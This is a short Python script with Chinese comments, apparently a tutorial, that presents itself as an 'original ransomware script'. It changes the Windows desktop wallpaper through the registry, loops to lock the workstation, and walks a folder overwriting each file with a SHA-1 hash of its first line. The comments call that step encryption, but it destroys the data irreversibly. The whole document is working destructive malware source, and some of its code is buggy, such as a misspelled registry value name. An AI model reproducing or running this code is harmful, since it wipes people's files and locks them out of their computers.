#控制windows系统的
import win32api,win32con,win32gui

#文件加密包 标准库
import hashlib

#系统库
import os

#可以利用python去调用dll动态库的包 嵌入式开发
from ctypes import *

#时间包  控制程序的休眠时间
import time

#括号里面的是形参
def desktop_img(bmp_path):
    #打开windows注册表  HKEY_CURRENT_USER 注册表  并且设置属性
    k = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,'cONTROL panel\\Desktop',0,win32con.KEY_SET_VALUE)
    #在HKEY_CURRENT_USER 注册表中写入属性值 0 桌面壁纸居中  2 拉伸桌面
    win32api.RegSetValueEx(k,'WapaperStyle',0,win32con.REG_SZ,'2')
    win32api.RegSetValueEx(k,'TileWallpaper',0,win32con.REG_SZ,'0')

    #刷新桌面
    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,bmp_path,win32con.SPIF_SENDWININICHANGE)

#desktop_img('G：\\1.jpg')


'''
利用死循环去调用windows系统下面的user32.dll动态库
'''
def lock_windows():
    while True:
        user32 = windll.LoadLibrary('user32.dll')
        user32.LockWorkStation()
        time.sleep(1000000)
#lock_windows()




#原始勒索脚本
def lock_file(file):
    #把path中包含'~'和‘~user’转化成用户目录
    path = os.path.expanduser(file)

    #返回指定的文件夹包含的文件或者文件夹名字的列表
    for f in os.listdir(path):
        # 删除文件名的空格
        swd = f.strip()         #去空格
        print(swd)

        #文件操作  在文件操作中做加密 rb+ 读写字节
        with open(file + '/' + swd , 'rb+') as f:
            pod = f.readline()

            #加密
            sha1 = hashlib.sha1(pod)

            #把加密后的内容转成十六进制字符串值
            osv = sha1.hexdigest()


        with open(file + '/' + swd , 'wb') as b :
            gs = bytes(osv,encoding='utf-8')
            b.write(gs)
            print('加密完成:%s'% file)


























